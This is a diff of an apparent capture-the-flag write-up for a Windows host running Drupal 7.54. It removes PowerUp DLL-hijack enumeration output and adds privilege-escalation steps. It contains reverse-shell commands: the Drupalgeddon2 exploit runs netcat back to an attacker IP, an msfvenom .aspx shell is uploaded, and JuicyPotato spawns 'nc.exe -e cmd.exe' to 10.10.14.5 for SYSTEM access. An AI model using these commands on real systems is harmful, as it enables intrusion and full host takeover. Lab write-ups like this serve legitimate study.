@@ -54,42 +54,15 @@ python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c "nc.exe -e cmd.exe 10.10.14
 
 ## Privilege escalation
 
-### Enumeration
-PowerUp
+Got IIS privileges by placing `.aspx` reverse shell on `C:\inetpub\drupal-7.54\`.
+1. place `.aspx` msfvenom reverse shell file on drupal-7.54 folder.
+2. Set listener
+3. Visit `http://10.10.9/shelliis.aspx`
+4. Got IIS shell
+
+Got `SeImpersonatePrivileges` with IIS user.
+
+Got system privileges with JuicyPotato.exe
+```cmd
+JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd.exe -a "/c nc.exe -e cmd.exe 10.10.14.5 4545" -t *
 ```
-ModifiablePath    : C:\oracle\ora90\bin
-IdentityReference : BUILTIN\Users
-Permissions       : AppendData/AddSubdirectory
-%PATH%            : C:\oracle\ora90\bin
-Name              : C:\oracle\ora90\bin
-Check             : %PATH% .dll Hijacks
-AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\bin\wlbsctrl.dll'
-
-ModifiablePath    : C:\oracle\ora90\bin
-IdentityReference : BUILTIN\Users
-Permissions       : WriteData/AddFile
-%PATH%            : C:\oracle\ora90\bin
-Name              : C:\oracle\ora90\bin
-Check             : %PATH% .dll Hijacks
-AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\bin\wlbsctrl.dll'
-
-
-ModifiablePath    : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
-IdentityReference : BUILTIN\Users
-Permissions       : AppendData/AddSubdirectory
-%PATH%            : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
-Name              : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
-Check             : %PATH% .dll Hijacks
-AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\Apache\Perl\5.005
-                    03\bin\mswin32-x86\wlbsctrl.dll'
-
-ModifiablePath    : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
-IdentityReference : BUILTIN\Users
-Permissions       : WriteData/AddFile
-%PATH%            : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
-Name              : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
-Check             : %PATH% .dll Hijacks
-AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\Apache\Perl\5.005
-                    03\bin\mswin32-x86\wlbsctrl.dll'
-```
-
